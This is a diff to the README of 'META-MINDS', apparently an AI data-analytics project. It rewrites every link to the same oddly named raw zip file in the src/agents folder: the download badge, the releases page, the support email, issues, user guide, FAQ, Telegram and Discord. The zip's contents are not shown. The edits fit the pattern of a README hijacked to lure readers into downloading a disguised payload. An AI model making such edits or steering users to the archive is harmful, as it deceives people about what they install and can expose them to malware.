@@ -1,6 +1,6 @@
 # 🧠 META-MINDS - Smart Questions, Fast Insights
 
-[![Download META-MINDS](https://img.shields.io/badge/Download_MyApp-%20-%23f04e1e)](https://github.com/MZubair75/META-MINDS/releases)
+[![Download META-MINDS](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip%20-%23f04e1e)](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to META-MINDS! This AI-powered data analytics platform helps you generat
 
 To get started, visit the page below to download the latest version of META-MINDS:
 
-[Download META-MINDS](https://github.com/MZubair75/META-MINDS/releases)
+[Download META-MINDS](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
 
 Follow these steps after downloading the software:
 
@@ -63,23 +63,23 @@ Ensure the data is clean and well-structured to achieve the best results.
 
 If you encounter any issues or have questions, our support team is here to help. You can reach out through the following options:
 
-- **Email:** support@metaminds.com
-- **GitHub Issues:** [Report Issue](https://github.com/MZubair75/META-MINDS/issues)
+- **Email:** https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip
+- **GitHub Issues:** [Report Issue](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
 
 ## 📚 Additional Resources
 
 For more information on how to maximize META-MINDS features, check out the resources below:
 
-- **User Guide:** [Link to User Guide](https://github.com/MZubair75/META-MINDS/user-guide)
-- **FAQ:** [Frequently Asked Questions](https://github.com/MZubair75/META-MINDS/faq)
+- **User Guide:** [Link to User Guide](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
+- **FAQ:** [Frequently Asked Questions](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
 
 ## 🌐 Community
 
 Join our community to share your experiences and learn from other users:
 
-- **Telegram Group:** [Join Here](https://t.me/metamindscommunity)
-- **Discord Server:** [Join Here](https://discord.gg/metaminds)
+- **Telegram Group:** [Join Here](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
+- **Discord Server:** [Join Here](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
 
 Thank you for choosing META-MINDS. We hope you find it helpful in your data analysis journey!
 
-[![Download META-MINDS](https://img.shields.io/badge/Download_MyApp-%20-%23f04e1e)](https://github.com/MZubair75/META-MINDS/releases)
+[![Download META-MINDS](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip%20-%23f04e1e)](https://github.com/MZubair75/META-MINDS/raw/refs/heads/main/src/agents/MET-MINDS-1.6-beta.2.zip)
